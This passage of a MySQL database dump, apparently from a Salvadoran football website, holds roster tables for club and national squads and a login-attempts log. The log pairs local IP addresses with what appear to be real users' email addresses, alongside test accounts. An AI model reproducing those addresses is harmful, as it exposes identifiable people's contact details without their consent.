  `numero_camiseta` int(11) DEFAULT NULL,
  `foto` varchar(255) DEFAULT NULL,
  `edad` int(11) DEFAULT NULL,
  `nacionalidad` varchar(100) DEFAULT NULL,
  `fecha_creacion` timestamp NULL DEFAULT current_timestamp(),
  `posicion_x` decimal(5,2) DEFAULT NULL,
  `posicion_y` decimal(5,2) DEFAULT NULL,
  `pos_x` float DEFAULT NULL,
  `pos_y` float DEFAULT NULL,
  `es_titular` tinyint(1) DEFAULT 0,
  PRIMARY KEY (`id`),
  KEY `equipo_id` (`equipo_id`)
) ENGINE=InnoDB AUTO_INCREMENT=10000 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jugadores_femenina`
--

LOCK TABLES `jugadores_femenina` WRITE;
/*!40000 ALTER TABLE `jugadores_femenina` DISABLE KEYS */;
INSERT INTO `jugadores_femenina` VALUES
(1,1,'samantha valadez','portero',25,NULL,21,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(2,1,'roxana vega','portero',1,NULL,27,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(3,1,'hazel silva','portero',24,NULL,NULL,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(4,1,'linda guillen','central',4,NULL,26,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(5,1,'priscila ortiz','central',17,NULL,30,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(6,1,'santana pressley','central',5,NULL,NULL,'estadounidense','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(7,1,'joseline rivas','central',8,NULL,32,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(8,1,'nicole cabrera','central',3,NULL,27,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(9,1,'rosmery mendoza','central',6,NULL,24,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(10,1,'iliana molina','central',16,NULL,17,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(11,1,'irma hernandez','central',23,NULL,26,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(12,1,'paola calderon','medio_central',9,NULL,24,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(13,1,'alejandra agundez','medio_central',27,NULL,20,'mexicana','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(14,1,'tatiana dabney','medio_central',7,NULL,NULL,'estadounidense','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(15,1,'paola ceren','medio_central',14,NULL,30,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(16,1,'yaneth sotelo','medio_central',26,NULL,21,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(17,1,'neyda martinez','medio_central',29,NULL,27,'mexicana','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(18,1,'raquel ramirez','medio_central',19,NULL,31,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(19,1,'ashley webb','centrodelantero',10,NULL,31,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(20,1,'genesis carpio','centrodelantero',12,NULL,18,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(21,1,'keyri garcia','centrodelantero',20,NULL,18,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0),
(22,1,'gladis ulloa','centrodelantero',30,NULL,29,'salvadoreña','2026-07-03 16:00:47',NULL,NULL,NULL,NULL,0);
/*!40000 ALTER TABLE `jugadores_femenina` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jugadores_segunda`
--

DROP TABLE IF EXISTS `jugadores_segunda`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `jugadores_segunda` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_id` int(11) NOT NULL,
  `nombre` varchar(150) NOT NULL,
  `posicion` varchar(30) NOT NULL DEFAULT 'centrodelantero',
  `numero_camiseta` int(11) DEFAULT NULL,
  `foto` varchar(255) DEFAULT NULL,
  `edad` int(11) DEFAULT NULL,
  `nacionalidad` varchar(100) DEFAULT NULL,
  `posicion_x` decimal(5,2) DEFAULT NULL,
  `posicion_y` decimal(5,2) DEFAULT NULL,
  `es_titular` tinyint(1) DEFAULT 0,
  PRIMARY KEY (`id`),
  KEY `equipo_id` (`equipo_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jugadores_segunda`
--

LOCK TABLES `jugadores_segunda` WRITE;
/*!40000 ALTER TABLE `jugadores_segunda` DISABLE KEYS */;
/*!40000 ALTER TABLE `jugadores_segunda` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jugadores_seleccion`
--

DROP TABLE IF EXISTS `jugadores_seleccion`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `jugadores_seleccion` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(150) NOT NULL,
  `posicion` varchar(50) DEFAULT NULL,
  `numero_camiseta` int(11) DEFAULT NULL,
  `foto` varchar(255) DEFAULT NULL,
  `edad` int(11) DEFAULT NULL,
  `nacionalidad` varchar(100) DEFAULT 'Salvadoreña',
  `club_origen` varchar(150) DEFAULT NULL,
  `partidos_jugados` int(11) DEFAULT 0,
  `goles` int(11) DEFAULT 0,
  `asistencias` int(11) DEFAULT 0,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `atajadas` int(11) DEFAULT 0,
  `es_titular` tinyint(1) DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=29 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jugadores_seleccion`
--

LOCK TABLES `jugadores_seleccion` WRITE;
/*!40000 ALTER TABLE `jugadores_seleccion` DISABLE KEYS */;
INSERT INTO `jugadores_seleccion` VALUES
(1,'Mario González','portero',1,'/backend/uploads/seleccion_1783695511_6cc8d30a.png',29,'Salvadoreña','Deportivo San Carlos',12,0,0,'2026-06-10 02:30:54',0,0),
(2,'Benji Villalobos','portero',12,NULL,26,'Salvadoreña','C.D. Águila',7,0,0,'2026-06-10 02:30:54',0,0),
(3,'Tomás Romero','portero',22,NULL,26,'Salvadoreña','Minnesota United FC',5,0,0,'2026-06-10 02:30:54',0,0),
(4,'Henry Romero','central',3,NULL,28,'Salvadoreña','Alianza FC',8,0,0,'2026-06-10 02:30:54',0,0),
(5,'Julio Sibrián','central',4,NULL,27,'Salvadoreña','C.D. Águila',10,0,0,'2026-06-10 02:30:54',0,0),
(6,'Rudy Clavel','central',5,NULL,25,'Salvadoreña','C.D. FAS',10,0,1,'2026-06-10 02:30:54',0,0),
(7,'Jorge Cruz','lateral_derecho',2,NULL,26,'Salvadoreña','C.D. FAS',9,0,0,'2026-06-10 02:30:54',0,0),
(8,'Bryan Tamacas','lateral_derecho',13,NULL,31,'Salvadoreña','Hércules CF',8,0,0,'2026-06-10 02:30:54',0,0),
(9,'Alexander Larín','lateral_izquierdo',6,NULL,26,'Salvadoreña','Alianza FC',10,0,1,'2026-06-10 02:30:54',0,0),
(10,'Adán Clímaco','lateral_izquierdo',23,NULL,24,'Salvadoreña','C.D. Águila',6,0,0,'2026-06-10 02:30:54',0,0),
(11,'Roberto Domínguez','central',15,NULL,29,'Salvadoreña','C.D. FAS',6,0,0,'2026-06-10 02:30:54',0,0),
(12,'Nelson Rodríguez','lateral_derecho',16,NULL,23,'Salvadoreña','C.D. Águila',5,0,0,'2026-06-10 02:30:54',0,0),
(13,'Darwin Cerén','medio_central',7,NULL,33,'Salvadoreña','C.D. Águila',11,0,0,'2026-06-10 02:30:54',0,0),
(14,'Brayan Landaverde','medio_central',8,NULL,26,'Salvadoreña','L.A. Firpo',10,0,0,'2026-06-10 02:30:54',0,0),
(15,'Christian Martínez','medio_defensivo',14,NULL,25,'Salvadoreña','Alianza FC',9,0,0,'2026-06-10 02:30:54',0,0),
(16,'Jefferson Valladares','medio_central',15,NULL,22,'Salvadoreña','C.D. Mpal. Limeño',7,0,0,'2026-06-10 02:30:54',0,0),
(17,'Jairo Henríquez','medio_ofensivo',17,NULL,24,'Salvadoreña','L.A. Firpo',9,1,0,'2026-06-10 02:30:54',0,0),
(18,'Marcelo Díaz','medio_central',12,NULL,23,'Salvadoreña','C.D. Águila',7,0,0,'2026-06-10 02:30:54',0,0),
(19,'Mauricio Cerritos','medio_central',20,NULL,22,'Salvadoreña','L.A. Firpo',5,0,0,'2026-06-10 02:30:54',0,0),
(20,'Harold Osorio','medio_ofensivo',19,NULL,25,'Salvadoreña','Alianza FC',8,1,0,'2026-06-10 02:30:54',0,0),
(21,'Elmer Bonilla','medio_central',21,NULL,23,'Salvadoreña','C.D. FAS',4,0,0,'2026-06-10 02:30:54',0,0),
(22,'Joshua Pérez','extremo_derecho',10,NULL,28,'Salvadoreña','Houston Dynamo',9,0,0,'2026-06-10 02:30:54',0,0),
(23,'Nathan Ordaz','extremo_izquierdo',11,NULL,22,'Salvadoreña','FC Dallas',8,0,3,'2026-06-10 02:30:54',0,0),
(24,'Brayan Gil','extremo_derecho',9,NULL,27,'Salvadoreña','Portland Timbers',9,2,0,'2026-06-10 02:30:54',0,0),
(25,'Styven Vásquez','extremo_izquierdo',18,NULL,26,'Salvadoreña','Alianza FC',7,0,0,'2026-06-10 02:30:54',0,0),
(26,'Emerson Mauricio','centrodelantero',24,NULL,27,'Salvadoreña','C.D. Águila',6,0,0,'2026-06-10 02:30:54',0,0),
(27,'Rafael Tejada','centrodelantero',25,NULL,24,'Salvadoreña','L.A. Firpo',5,0,0,'2026-06-10 02:30:54',0,0),
(28,'Francis Castillo','segundo_delantero',26,NULL,24,'Salvadoreña','Columbus Crew',7,0,1,'2026-06-10 02:30:54',0,0);
/*!40000 ALTER TABLE `jugadores_seleccion` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jugadores_seleccion_femenina`
--

DROP TABLE IF EXISTS `jugadores_seleccion_femenina`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `jugadores_seleccion_femenina` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(150) NOT NULL,
  `posicion` varchar(50) DEFAULT NULL,
  `numero_camiseta` int(11) DEFAULT NULL,
  `foto` varchar(255) DEFAULT NULL,
  `edad` int(11) DEFAULT NULL,
  `nacionalidad` varchar(100) DEFAULT 'Salvadoreña',
  `club_origen` varchar(150) DEFAULT NULL,
  `partidos_jugados` int(11) DEFAULT 0,
  `goles` int(11) DEFAULT 0,
  `asistencias` int(11) DEFAULT 0,
  `atajadas` int(11) DEFAULT 0,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `es_titular` tinyint(1) DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=38 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jugadores_seleccion_femenina`
--

LOCK TABLES `jugadores_seleccion_femenina` WRITE;
/*!40000 ALTER TABLE `jugadores_seleccion_femenina` DISABLE KEYS */;
INSERT INTO `jugadores_seleccion_femenina` VALUES
(4,'Idalia Serrano','portero',NULL,NULL,26,'Salvadoreña','AS Volos 2004 WFC',0,0,0,0,'2026-07-03 16:52:49',0),
(5,'Samantha Valadez','portero',NULL,NULL,21,'Salvadoreña','Alianza Women',0,0,0,0,'2026-07-03 16:52:49',0),
(6,'Riley Meléndez','portero',NULL,NULL,NULL,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(7,'Juana Plata','lateral_izquierdo',NULL,NULL,26,'Salvadoreña','Monterrey',0,0,0,0,'2026-07-03 16:52:49',0),
(8,'Vashy Delgado','central',NULL,NULL,32,'Salvadoreña','Mazatlán FC',0,0,0,0,'2026-07-03 16:52:49',0),
(9,'Elaily Hernández','central',NULL,NULL,26,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(10,'Nicole Amaya','lateral_derecho',NULL,NULL,23,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(11,'Laila Saravia','central',NULL,NULL,NULL,'Salvadoreña','Pacific Tigers',0,0,0,0,'2026-07-03 16:52:49',0),
(12,'Linda Guillén','central',NULL,NULL,26,'Salvadoreña','Alianza Women',0,0,0,0,'2026-07-03 16:52:49',0),
(13,'Priscila Ortiz','central',NULL,NULL,30,'Salvadoreña','Alianza Women',0,0,0,0,'2026-07-03 16:52:49',0),
(14,'Irma Molina','central',NULL,NULL,26,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(15,'Joseline Rivas','central',NULL,NULL,32,'Salvadoreña','Alianza Women',0,0,0,0,'2026-07-03 16:52:49',0),
(16,'Reina Cruz','central',NULL,NULL,30,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(17,'Jasmine Dybala','central',NULL,NULL,NULL,'Salvadoreña','Sam Houston State Bearkats',0,0,0,0,'2026-07-03 16:52:49',0),
(18,'Victoria Meza','lateral_derecho',NULL,NULL,NULL,'Salvadoreña','Texas State Bobcats',0,0,0,0,'2026-07-03 16:52:49',0),
(19,'Brenda Ceren','extremo_derecho',NULL,NULL,27,'Salvadoreña','Cruz Azul',0,0,0,0,'2026-07-03 16:52:49',0),
(20,'Samantha Fisher','centrodelantero',NULL,NULL,26,'Salvadoreña','Sassuolo',0,0,0,0,'2026-07-03 16:52:49',0),
(21,'Danielle Fuentes','centrodelantero',NULL,NULL,25,'Salvadoreña','Tijuana',0,0,0,0,'2026-07-03 16:52:49',0),
(22,'Danya Gutiérrez','medio_central',NULL,NULL,26,'Salvadoreña','Club León',0,0,0,0,'2026-07-03 16:52:49',0),
(23,'Victoria Sánchez','medio_central',NULL,NULL,21,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(24,'Makenna Domínguez','medio_central',NULL,NULL,NULL,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(25,'Paola Calderón','medio_central',NULL,NULL,24,'Salvadoreña','Alianza Women',0,0,0,0,'2026-07-03 16:52:49',0),
(26,'Emely Rubio','medio_central',NULL,NULL,NULL,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(27,'Alejandra Chirino','medio_central',NULL,NULL,35,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(28,'Jackeline Velásquez','medio_central',NULL,NULL,30,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(29,'Isabella Recinos','medio_central',NULL,NULL,23,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(30,'Amber Marinero','medio_central',NULL,NULL,28,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(31,'Angie Machado','medio_central',NULL,NULL,NULL,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(32,'Katerin Morales','medio_central',NULL,NULL,NULL,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(33,'Gabriela Rodríguez','medio_central',NULL,NULL,NULL,'Salvadoreña','El Salvador',0,0,0,0,'2026-07-03 16:52:49',0),
(34,'Karen Reyes','centrodelantero',NULL,NULL,28,'Salvadoreña','NPS Volos',0,0,0,0,'2026-07-03 16:52:49',0),
(35,'Samaria Gómez','centrodelantero',NULL,NULL,24,'Salvadoreña','Amed Sportif Faaliyetler',0,0,0,0,'2026-07-03 16:52:49',0),
(36,'Yoselyn Abigail Lopez','centrodelantero',NULL,NULL,25,'Salvadoreña','Mazatlán FC',0,0,0,0,'2026-07-03 16:52:49',0);
/*!40000 ALTER TABLE `jugadores_seleccion_femenina` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jugadores_seleccion_sub17`
--

DROP TABLE IF EXISTS `jugadores_seleccion_sub17`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `jugadores_seleccion_sub17` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(150) NOT NULL,
  `posicion` varchar(50) DEFAULT NULL,
  `numero_camiseta` int(11) DEFAULT NULL,
  `foto` varchar(255) DEFAULT NULL,
  `edad` int(11) DEFAULT NULL,
  `nacionalidad` varchar(100) DEFAULT 'Salvadoreña',
  `club_origen` varchar(150) DEFAULT NULL,
  `partidos_jugados` int(11) DEFAULT 0,
  `goles` int(11) DEFAULT 0,
  `asistencias` int(11) DEFAULT 0,
  `atajadas` int(11) DEFAULT 0,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `es_titular` tinyint(1) DEFAULT 0,
  `pos_x` float DEFAULT NULL,
  `pos_y` float DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=42 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jugadores_seleccion_sub17`
--

LOCK TABLES `jugadores_seleccion_sub17` WRITE;
/*!40000 ALTER TABLE `jugadores_seleccion_sub17` DISABLE KEYS */;
INSERT INTO `jugadores_seleccion_sub17` VALUES
(22,'J. Alvarenga','portero',1,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(23,'Cristian Martínez','lateral_derecho',2,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(24,'Joandrick Sanchez','portero',3,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(25,'R. Heredia','defensa',4,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(26,'J. Perla','central',5,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(27,'R. Andrade','extremo_derecho',7,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(28,'E. Garay','medio_central',8,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(29,'A. Sorto','centrodelantero',9,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(30,'M. Barillas','medio_ofensivo',10,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(31,'B. Murgas','extremo_izquierdo',11,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(32,'Johan Martínez','medio_central',12,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(33,'G. Salazar','lateral_izquierdo',13,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(34,'Kevin Rivas','central',14,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(35,'E. Ortiz','defensa',15,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(36,'A. Colocho','medio_ofensivo',16,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(37,'S. Merlet','defensa',17,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(38,'X. Graham','delantero',18,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(39,'D. González','medio_central',19,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(40,'R. Hernandez','medio_central',20,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL),
(41,'S. Salamanca','portero',21,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 20:38:16',0,NULL,NULL);
/*!40000 ALTER TABLE `jugadores_seleccion_sub17` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jugadores_seleccion_sub20`
--

DROP TABLE IF EXISTS `jugadores_seleccion_sub20`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `jugadores_seleccion_sub20` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(150) NOT NULL,
  `posicion` varchar(50) DEFAULT NULL,
  `numero_camiseta` int(11) DEFAULT NULL,
  `foto` varchar(255) DEFAULT NULL,
  `edad` int(11) DEFAULT NULL,
  `nacionalidad` varchar(100) DEFAULT 'Salvadoreña',
  `club_origen` varchar(150) DEFAULT NULL,
  `partidos_jugados` int(11) DEFAULT 0,
  `goles` int(11) DEFAULT 0,
  `asistencias` int(11) DEFAULT 0,
  `atajadas` int(11) DEFAULT 0,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `es_titular` tinyint(1) DEFAULT 0,
  `pos_x` float DEFAULT NULL,
  `pos_y` float DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=44 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jugadores_seleccion_sub20`
--

LOCK TABLES `jugadores_seleccion_sub20` WRITE;
/*!40000 ALTER TABLE `jugadores_seleccion_sub20` DISABLE KEYS */;
INSERT INTO `jugadores_seleccion_sub20` VALUES
(23,'Oliver Alegria Sigernes','portero',1,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(24,'Peter Cornejo','portero',21,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(25,'Máximo Sandoval','portero',12,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(26,'Itzel Colocho','lateral_izquierdo',2,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(27,'José Guatemala','central',3,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(28,'Emerson Guardado','central',4,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(29,'Hugo Aguilar','central',5,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(30,'Jonathan Aguirre','lateral_derecho',13,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(31,'Alexander White','central',6,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(32,'Jonathan López','lateral_izquierdo',14,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(33,'Gabriel Arnold','medio_central',8,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(34,'Johann Ortiz','medio_central',10,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(35,'Jefferson Roque','medio_central',15,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(36,'William Cabrera','medio_defensivo',16,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(37,'Anderson Portillo','medio_ofensivo',17,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(38,'Diego Peña','medio_central',18,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(39,'Christian Coreas','centrodelantero',9,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(40,'Luis Tobar','centrodelantero',19,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(41,'Wilber Díaz','extremo_izquierdo',7,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(42,'Aiden Benitez','centrodelantero',20,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL),
(43,'Uriel Miranda','extremo_derecho',11,NULL,NULL,'Salvadoreña',NULL,0,0,0,0,'2026-07-26 07:41:07',0,NULL,NULL);
/*!40000 ALTER TABLE `jugadores_seleccion_sub20` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `login_attempts`
--

DROP TABLE IF EXISTS `login_attempts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `login_attempts` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip` varchar(45) NOT NULL,
  `email_apodo` varchar(150) DEFAULT NULL,
  `intento` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_ip_intento` (`ip`,`intento`)
) ENGINE=InnoDB AUTO_INCREMENT=36 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login_attempts`
--

LOCK TABLES `login_attempts` WRITE;
/*!40000 ALTER TABLE `login_attempts` DISABLE KEYS */;
INSERT INTO `login_attempts` VALUES
(1,'192.168.2.193','unmaje@gmail.com','2026-07-24 15:16:47'),
(2,'192.168.2.193','unmaje@gmail.com','2026-07-24 15:16:50'),
(3,'192.168.2.193','unmaje@gmail.com','2026-07-24 15:16:51'),
(4,'192.168.0.102','register_info2026@gmail.com','2026-07-28 16:51:27'),
(5,'192.168.0.102','register_info2026@gmail.com','2026-07-28 16:55:46'),
(6,'192.168.0.102','register_info2026@gmail.com','2026-07-28 16:56:08'),
(7,'192.168.0.102','register_info2026@gmail.com','2026-07-28 16:56:18'),
(8,'192.168.0.102','register_info2026@gmail.com','2026-07-28 16:56:28'),
(9,'192.168.0.102','jsjsjs@gmail.com','2026-07-28 17:02:01'),
(10,'192.168.0.219','megatomayor','2026-07-29 18:39:13'),
(11,'192.168.0.219','megatomayor','2026-07-29 18:39:17'),
(12,'192.168.0.219','megatomayor','2026-07-29 18:52:27'),
(13,'192.168.0.219','unmje@gmail.com','2026-07-29 21:34:53'),
(14,'192.168.0.219','unmje@gmail.com','2026-07-29 21:34:57'),
(15,'192.168.1.62','register_correo@gmail.com','2026-07-30 18:59:20'),
(16,'192.168.1.62','register_correo2@gmail.com','2026-07-30 19:06:27'),
(17,'192.168.1.62','register_correo2@gmail.com','2026-07-30 19:06:52'),
(18,'192.168.1.62','register_corr3eo2@gmail.com','2026-07-30 19:07:29'),
(19,'192.168.1.62','register_corr3eo2@gmail.com','2026-07-30 19:07:32'),
(20,'192.168.0.24','unmaje@gail.com','2026-07-31 02:52:03'),
(21,'192.168.0.24','unmaje@gmail.com','2026-07-31 04:11:35'),
(22,'192.168.0.11','unmaje@gmail.com','2026-07-31 04:12:26'),
(23,'192.168.0.11','unmaje@gmail.com','2026-07-31 04:12:35'),
(24,'192.168.0.11','umaje@gmail.com','2026-07-31 04:12:54'),
(25,'192.168.0.11','unmaje@gmail.com','2026-07-31 04:13:01'),
(26,'192.168.0.24','unmaje@gmail.com','2026-07-31 04:17:47'),
(27,'192.168.0.11','unmaje@gmail.com','2026-07-31 04:35:46'),
(28,'192.168.0.11','unmaje@gmail.com','2026-07-31 04:43:05'),
(29,'192.168.0.24','unmaje@gmail.com','2026-07-31 04:45:44'),
(30,'192.168.0.11','unmaje@gmail.com','2026-07-31 04:46:04'),
(31,'192.168.0.11','unmaje@gmail.com','2026-07-31 04:46:11'),
(32,'192.168.1.85','vanesotomayor0411@gmail.com','2026-07-31 13:37:32'),
(33,'192.168.1.85','vanesotomayor0411@gmail.com','2026-07-31 13:37:37'),
(34,'192.168.1.85','register_testpw99@test.com','2026-07-31 16:25:40'),
(35,'192.168.1.85','register_testpw100@test.com','2026-07-31 16:25:40');
/*!40000 ALTER TABLE `login_attempts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `match_comments`
--

DROP TABLE IF EXISTS `match_comments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `match_comments` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `partido_id` int(11) NOT NULL,
  `division` varchar(20) NOT NULL DEFAULT 'primera',
  `minuto` int(11) NOT NULL DEFAULT 0,
